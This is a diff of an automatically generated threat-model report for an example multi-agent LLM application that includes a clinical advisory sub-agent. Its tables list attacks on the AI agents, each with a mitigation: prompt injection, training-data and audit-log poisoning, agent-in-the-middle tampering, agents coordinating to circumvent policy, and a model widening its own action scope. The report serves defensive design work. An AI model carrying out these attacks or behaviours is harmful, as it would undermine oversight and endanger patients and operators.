 | I-4 | [UNCHANGED] | Inter-Agent Communication Channel | Inter-agent messages observable to unauthorized Application Zone processes | Critical | End-to-end per-message encryption between agents; access control on channel |
 | I-7 | [UNCHANGED] | Audit Logger | Unauthorized read access exposes full operational history of agent system | Critical | Strict read access controls; encrypt at-rest with envelope encryption |
-| I-9 | [NEW] | Clinical Advisory Sub-Agent | Clinical context leaks in Orchestrator response; sensitive clinical data in training stream via logs | Critical | Output scrubbing on ClinAdvisor outputs; field-level classification on Clinical Decision Log Entries |
+| I-9 | [UNCHANGED] | Clinical Advisory Sub-Agent | Clinical context leaks in Orchestrator response; sensitive clinical data in training stream via logs | Critical | Output scrubbing on ClinAdvisor outputs; field-level classification on Clinical Decision Log Entries |
 | D-1 | [UNCHANGED] | Guardrails Service | Resource exhaustion via high-volume computationally-expensive prompt submission | Critical | Per-IP/session rate limiting before Guardrails; computational budget per prompt |
 | D-2 | [UNCHANGED] | LLM Agent Orchestrator | Inference pipeline exhaustion via high-token prompts or recursive tool chains | Critical | Per-session token budgets; circuit breakers on tool chains; load shedding |
 | D-5 | [UNCHANGED] | MCP Tool Server | Connection pool exhaustion via high-volume tool call requests | Critical | Per-caller/tool rate limiting; connection pool overflow rejection; circuit breakers |
@@ -497,13 +580,14 @@ Sorted by risk level descending, then by table appearance order:
 | E-4 | [UNCHANGED] | Inter-Agent Communication Channel | Application Zone process injects messages with forged elevated sender identity | Critical | Enforce sender identity authentication at Channel; reject unverified messages |
 | E-5 | [UNCHANGED] | MCP Tool Server | Unauthorized tool calls gain Tool Server execution privileges and credential set | Critical | Zero-trust authorization at Tool Server; per-tool least-privilege service accounts |
 | E-6 | [UNCHANGED] | Long-Running Learning Loop | Poisoned update escalates attacker from data access to model parameter control | Critical | Signed model updates via HSM; staged rollout with capability regression |
-| E-7 | [NEW] | Clinical Advisory Sub-Agent | Prompt injection via clinical query elevates sub-agent to self-authorize KB scope expansion or manipulate Orchestrator tool decisions | Critical | Instruction-boundary enforcement; clinical output validator; per-session KB scope enforcement |
+| E-7 | [UNCHANGED] | Clinical Advisory Sub-Agent | Prompt injection via clinical query elevates sub-agent to self-authorize KB scope expansion or manipulate Orchestrator tool decisions | Critical | Instruction-boundary enforcement; clinical output validator; per-session KB scope enforcement |
 | AG-1 | [UNCHANGED] | LLM Agent Orchestrator | Prompt injection causes autonomous unauthorized high-impact actions | Critical | Scope-enforcement layer; human-in-the-loop for high-impact operations |
 | AG-2 | [UNCHANGED] | LLM Agent Orchestrator | Orchestrator+Specialist coordinate for policy circumvention above per-agent limits | Critical | Cross-agent rate limits; combined action sequence policy engine |
 | AG-3 | [UNCHANGED] | Specialist Agent | Adversarial delegation causes autonomous prohibited cumulative tool call sequence | Critical | Task-level intent verification; tool call budget per task |
 | AG-4 | [UNCHANGED] | Inter-Agent Communication Channel | Agent-in-the-middle intercepts and modifies delegation messages | Critical | End-to-end message authentication; replay detection |
 | AG-5 | [UNCHANGED] | MCP Tool Server | Tool call injection via LLM-influenced JSON-RPC parameters | Critical | Registered tool allowlist; per-tool parameter JSON Schema validation |
 | AG-7 | [UNCHANGED] | Long-Running Learning Loop | Training data causes model to expand autonomous action scope on next update | Critical | Capability auditing in update evaluation; capability allowlist enforced post-update |
+| AG-8 | [NEW] | Inter-Agent Communication Channel | Insecure inter-agent communication: no mTLS, no message signing, no replay prevention, no taint propagation on Orchestrator relay (OWASP ASI07:2026, AML.T0060) | Critical | mTLS on all inter-agent channels; HMAC/Ed25519 message signing; nonce-based replay prevention; taint labels across Orchestrator relay |
 | LLM-1 | [UNCHANGED] | LLM Agent Orchestrator | Direct prompt injection overrides system prompt or reveals configuration | Critical | Multi-layer injection detection; privilege-separated prompt architecture |
 | LLM-2 | [UNCHANGED] | LLM Agent Orchestrator | Indirect prompt injection via adversarial KB documents | Critical | Retrieval-time content sanitization; context segmentation marking |
 | LLM-4 | [UNCHANGED] | LLM Agent Orchestrator | Training data poisoning via Audit Logger-fed Learning Loop update | Critical | Training data validation; provenance tracking; adversarial training detection |
@@ -512,12 +596,13 @@ Sorted by risk level descending, then by table appearance order:
 | LLM-8 | [UNCHANGED] | Specialist Agent | Prompt injection via adversarial delegation messages hijacks task execution | Critical | Instruction boundary enforcement at Specialist; delegation signature verification |
 | LLM-9 | [UNCHANGED] | Specialist Agent | Training data poisoning via Specialist's own decision log self-poisoning loop | Critical | Provenance attestation; Specialist-specific behavioral baselining pre-deploy |
 | LLM-11 | [UNCHANGED] | Long-Running Learning Loop | Systematic audit log poisoning for delayed temporal model behavioral shift | Critical | Cryptographic log signing; anomaly detection; differential privacy training |
-| LLM-13 | [NEW] | Clinical Advisory Sub-Agent | Prompt injection via clinical query context overrides sub-agent system prompt | Critical | Instruction-boundary enforcement at ClinAdvisor; clinical-query content sanitization; output validation for system-prompt leakage |
-| LLM-14 | [NEW] | Clinical Advisory Sub-Agent | Training data poisoning via adversarial Clinical Decision Log Entries in Learning Loop | Critical | Clinical Decision Log provenance attestation; clinical-domain holdout evaluation before ClinAdvisor update deployment |
+| LLM-13 | [UNCHANGED] | Clinical Advisory Sub-Agent | Prompt injection via clinical query context overrides sub-agent system prompt | Critical | Instruction-boundary enforcement at ClinAdvisor; clinical-query content sanitization; output validation for system-prompt leakage |
+| LLM-14 | [UNCHANGED] | Clinical Advisory Sub-Agent | Training data poisoning via adversarial Clinical Decision Log Entries in Learning Loop | Critical | Clinical Decision Log provenance attestation; clinical-domain holdout evaluation before ClinAdvisor update deployment |
 | OI-1 | [UNCHANGED] | LLM Agent Orchestrator | Client-side XSS via LLM response to User browser (client-side execution) | Critical | textContent not innerHTML; DOMPurify with allowlist; strict CSP nonce |
 | OI-2 | [UNCHANGED] | LLM Agent Orchestrator | Server-side code/command execution via LLM-synthesized Tool Call Request parameters | Critical | MCP Tool Server parameter validation: SQL parameterization, argument vectors, allowlists |
-| MI-1 | [NEW] | Clinical Advisory Sub-Agent | Ungrounded factual emission: clinical summaries contain hallucinated medical claims without RAG grounding verification | Critical | Mandatory RAG grounding with per-claim source anchoring; retrieval-strength gate; clinical output validator |
-| MI-2 | [NEW] | Clinical Advisory Sub-Agent | Overreliance/Missing HITL: clinical recommendations surface without physician sign-off gate | Critical | Mandatory HITL physician sign-off gate; risk-threshold escalation; AI-provenance disclosure |
+| MI-1 | [UNCHANGED] | Clinical Advisory Sub-Agent | Ungrounded factual emission: clinical summaries contain hallucinated medical claims without RAG grounding verification | Critical | Mandatory RAG grounding with per-claim source anchoring; retrieval-strength gate; clinical output validator |
+| MI-2 | [UNCHANGED] | Clinical Advisory Sub-Agent | Overreliance/Missing HITL: clinical recommendations surface without physician sign-off gate | Critical | Mandatory HITL physician sign-off gate; risk-threshold escalation; AI-provenance disclosure |
+| MI-3 | [UNCHANGED] | Clinical Advisory Sub-Agent | Retrieval-grounding gap: KB retrieval failures cause fabricated clinical content presented with grounding confidence | Critical | Retrieval-quality gate; "insufficient grounding" response on low recall@k; KB currency monitoring |
 | S-2 | [UNCHANGED] | Guardrails Service | Direct bypass to Orchestrator internal endpoint without Guardrails | High | Enforce mTLS between Guardrails and Orchestrator; SPIFFE/SPIRE identity |
 | S-4 | [UNCHANGED] | Specialist Agent | Specialist impersonates Orchestrator to inject fabricated aggregated results | High | Sign Specialist→Channel messages; Orchestrator verifies result origin |
 | S-8 | [UNCHANGED] | External API | DNS hijacking/BGP attack redirects External API calls to attacker-controlled server | High | Certificate pinning on outbound HTTPS; HSTS preload |
@@ -527,7 +612,7 @@ Sorted by risk level descending, then by table appearance order:
 | R-4 | [UNCHANGED] | Specialist Agent | Specialist denies executed tool calls or produced specific results | High | Log all Specialist actions with content hashes and service key signatures |
 | R-6 | [UNCHANGED] | MCP Tool Server | Tool Server denies having executed specific tool invocation | High | Log all JSON-RPC invocations with caller identity and parameters before execution |
 | R-7 | [UNCHANGED] | Long-Running Learning Loop | Learning Loop denies having applied specific model update | High | Log model update events with training data hash and parameter diff hash |
-| R-9 | [NEW] | Clinical Advisory Sub-Agent | ClinAdvisor denies generating specific clinical summary; no non-repudiable log with KB document hashes | High | Log every clinical output with query hash, KB document IDs, summary hash, and sub-agent service key signature |
+| R-9 | [UNCHANGED] | Clinical Advisory Sub-Agent | ClinAdvisor denies generating specific clinical summary; no non-repudiable log with KB document hashes | High | Log every clinical output with query hash, KB document IDs, summary hash, and sub-agent service key signature |
 | I-3 | [UNCHANGED] | Specialist Agent | Sensitive delegation context leaked in Specialist results via channel or logs | High | Data minimization in delegation messages; output scrubbing on Specialist results |
 | I-5 | [UNCHANGED] | MCP Tool Server | Tool results containing PII logged verbatim to Audit Logger | High | Field-level classification in structured logging; hash/tokenize PII before logging |
 | I-6 | [UNCHANGED] | Knowledge Base | Full corpus exfiltration via unrestricted vector search queries | High | Per-session result limits; query rate limits; context-aware authorization |
@@ -535,7 +620,7 @@ Sorted by risk level descending, then by table appearance order:
 | D-3 | [UNCHANGED] | Specialist Agent | Computationally expensive delegated tasks exhaust Specialist capacity | High | Per-task time/resource limits; task queue depth limits; backpressure from Orchestrator |
 | D-4 | [UNCHANGED] | Inter-Agent Communication Channel | Message queue flooding drops legitimate coordination messages | High | Queue depth limits; per-sender rate limits; backpressure on overflow |
 | D-7 | [UNCHANGED] | Audit Logger | Log-flooding attack creates audit gaps and blocks pipeline operations | High | Asynchronous write queues; write rate limits per source; log rotation management |
-| D-9 | [NEW] | Clinical Advisory Sub-Agent | High-volume clinical queries exhaust sub-agent inference capacity and starve KB for Orchestrator | High | Per-session token budgets; per-query timeout limits; ClinAdvisor dispatch rate limiting |
+| D-9 | [UNCHANGED] | Clinical Advisory Sub-Agent | High-volume clinical queries exhaust sub-agent inference capacity and starve KB for Orchestrator | High | Per-session token budgets; per-query timeout limits; ClinAdvisor dispatch rate limiting |
 | E-3 | [UNCHANGED] | Specialist Agent | Forged delegation grants Specialist elevated permissions beyond session scope | High | MCP Tool Server validates Specialist's claimed scope against session authorization record |
 | AG-6 | [UNCHANGED] | MCP Tool Server | Runaway agent-driven tool calls exhaust External API rate limits and connection pool | High | Per-session/agent tool call budgets; per-tool circuit breakers; spend monitoring |
 | LLM-3 | [UNCHANGED] | LLM Agent Orchestrator | Model theft via systematic API probing and behavior extraction | High | Query rate limiting; anomaly detection for probing patterns; output watermarking |
@@ -543,8 +628,7 @@ Sorted by risk level descending, then by table appearance order:
 | LLM-10 | [UNCHANGED] | Specialist Agent | Server-side injection via tool result incorporation into subsequent tool calls | High | Sanitize tool results before context injection; allowlist-based parameter validation |
 | LLM-12 | [UNCHANGED] | Long-Running Learning Loop | Model theft via Learning Loop output artifact monitoring | High | Encrypt model update packages; model watermarking; restrict artifact access |
 | OI-3 | [UNCHANGED] | LLM Agent Orchestrator | SSRF via LLM-synthesized URL in Tool Call Request to MCP Tool Server (server-side) | High | URL allowlisting; egress firewall blocking RFC 1918/metadata; DNS pinning |
-| OI-4 | [NEW] | Clinical Advisory Sub-Agent | Server-side execution via clinical summary content injected into Orchestrator's downstream Tool Call Request | High | Orchestrator treats ClinAdvisor outputs as untrusted; parameterize before tool invocation; schema validation |
-| MI-3 | [NEW] | Clinical Advisory Sub-Agent | Retrieval-grounding gap: KB retrieval failures cause fabricated clinical content presented with grounding confidence | Critical | Retrieval-quality gate; "insufficient grounding" response on low recall@k; KB currency monitoring |
+| OI-4 | [UNCHANGED] | Clinical Advisory Sub-Agent | Server-side execution via clinical summary content injected into Orchestrator's downstream Tool Call Request | High | Orchestrator treats ClinAdvisor outputs as untrusted; parameterize before tool invocation; schema validation |
 | AGP-01 | [UNCHANGED] | LLM Agent Orchestrator | Multi-agent emergent behavior — cascading failures or feedback amplification bypassing per-agent safety evaluation | Medium | Fail-safe shutdown circuits; bounded action scopes; behavioral baselining of collective agent system |
 | R-1 | [UNCHANGED] | User | User denies submitting specific prompt; no non-repudiation controls | Medium | Request signing at client layer; log signed request hash |
 | R-2 | [UNCHANGED] | Guardrails Service | Guardrails denies filtering decisions without tamper-evident logs | Medium | Log all filtering decisions (pass and reject) atomically with monotonic sequence numbers |
@@ -558,108 +642,22 @@ Sorted by risk level descending, then by table appearance order:
 
 ## 8. Delta Summary
 
-**Baseline**: `/Users/david/Projects/tachi/examples/agentic-app/test-output/2026-04-19T03-20-30/threats.md` (schema 1.6, run `2026-04-19T03-20-30`)
+**Baseline**: `/Users/david/Projects/tachi/examples/agentic-app/test-output/2026-04-23T19-30-00-F2-wave4/threats.md` (schema 1.7, run `2026-04-23T19-30-00`)
 
 | Status | Count |
 |---|---|
-| NEW | 13 |
-| UNCHANGED | 71 |
+| NEW | 1 |
+| UNCHANGED | 83 |
 | UPDATED | 0 |
 | RESOLVED | 0 |
 | **Total** | **84** |
 
-Note: 71 UNCHANGED = original 70 findings + AGP-01 (carried from prior baseline). Architecture extension adds 13 new findings.
-
 **Finding-level changes**:
 
-**NEW findings** (13, all on Clinical Advisory Sub-Agent — newly-added component not present in baseline):
-- **[NEW]** S-9: Spoofing — Clinical Advisory Sub-Agent (unauthenticated JSON-RPC from Orchestrator)
-- **[NEW]** T-9: Tampering — Clinical Advisory Sub-Agent (adversarial KB documents / poisoned clinical query)
-- **[NEW]** R-9: Repudiation — Clinical Advisory Sub-Agent (no non-repudiable clinical output logs)
-- **[NEW]** I-9: Information Disclosure — Clinical Advisory Sub-Agent (clinical context leakage)
-- **[NEW]** D-9: Denial of Service — Clinical Advisory Sub-Agent (resource exhaustion via complex clinical queries)
-- **[NEW]** E-7: Elevation of Privilege — Clinical Advisory Sub-Agent (prompt injection via clinical query)
-- **[NEW]** LLM-13: Prompt Injection — Clinical Advisory Sub-Agent (via clinical query context)
-- **[NEW]** LLM-14: Data Poisoning — Clinical Advisory Sub-Agent (via Clinical Decision Log Entries)
-- **[NEW]** OI-4: Output Integrity — Clinical Advisory Sub-Agent (SSRF/server-side execution via clinical output downstream)
-- **[NEW]** MI-1: Misinformation — Clinical Advisory Sub-Agent (Ungrounded Factual Emission, Category 1)
-- **[NEW]** MI-2: Misinformation — Clinical Advisory Sub-Agent (Overreliance / Missing HITL, Category 3)
-- **[NEW]** MI-3: Misinformation — Clinical Advisory Sub-Agent (Retrieval-Grounding Gap, Category 4)
-- **[NEW]** CG-6 correlation group: T-9 + LLM-14 → Clinical Advisory Sub-Agent data-integrity chain
+**NEW findings** (1 — Feature 219 F-3 wave 3 enrichment, Inter-Agent Communication Channel):
+- **[NEW]** AG-8: Agentic (Tool-Abuse) — Inter-Agent Communication Channel — Insecure Inter-Agent Communication (OWASP ASI07:2026, Pattern Category 9): no mTLS, no message signing, no nonce-based replay prevention, no inter-agent taint propagation across Orchestrator relay. CWE-287 (Improper Authentication). MITRE ATLAS AML.T0060 (Agent-in-the-Middle).
 
-**UNCHANGED findings** (71): All 70 prior findings carried forward as UNCHANGED. AGP-01 (emergent behavior net-new from prior run) also UNCHANGED. Architecture and component inventory for all prior components unchanged between runs.
+**NEW correlation group** (1):
+- CG-7: D-4 + AG-8 → Inter-Agent Communication Channel (Denial-of-Service + Tool-Abuse/A2A)
 
----
-
-## 9. Source Attribution
-
-```yaml
-OI-1:
-  source_attribution:
-    - taxonomy: owasp
-      id: LLM05
-      relationship: primary
-    - taxonomy: cwe
-      id: CWE-79
-      relationship: related
-
-OI-2:
-  source_attribution:
-    - taxonomy: owasp
-      id: LLM05
-      relationship: primary
-    - taxonomy: cwe
-      id: CWE-89
-      relationship: related
-    - taxonomy: cwe
-      id: CWE-78
-      relationship: related
-
-OI-3:
-  source_attribution:
-    - taxonomy: owasp
-      id: LLM05
-      relationship: primary
-    - taxonomy: cwe
-      id: CWE-918
-      relationship: related
-
-OI-4:
-  source_attribution:
-    - taxonomy: owasp
-      id: LLM05
-      relationship: primary
-    - taxonomy: cwe
-      id: CWE-918
-      relationship: related
-    - taxonomy: cwe
-      id: CWE-78
-      relationship: related
-
-MI-1:
-  source_attribution:
-    - taxonomy: owasp
-      id: LLM09
-      relationship: primary
-    - taxonomy: cwe
-      id: CWE-345
-      relationship: related
-
-MI-2:
-  source_attribution:
-    - taxonomy: owasp
-      id: LLM09
-      relationship: primary
-    - taxonomy: cwe
-      id: CWE-223
-      relationship: related
-
-MI-3:
-  source_attribution:
-    - taxonomy: owasp
-      id: LLM09
-      relationship: primary
-    - taxonomy: cwe
-      id: CWE-345
-      relationship: related
-```
+**UNCHANGED findings** (83): All 83 prior findings carried forward as UNCHANGED. Architecture and component inventory unchanged between runs.
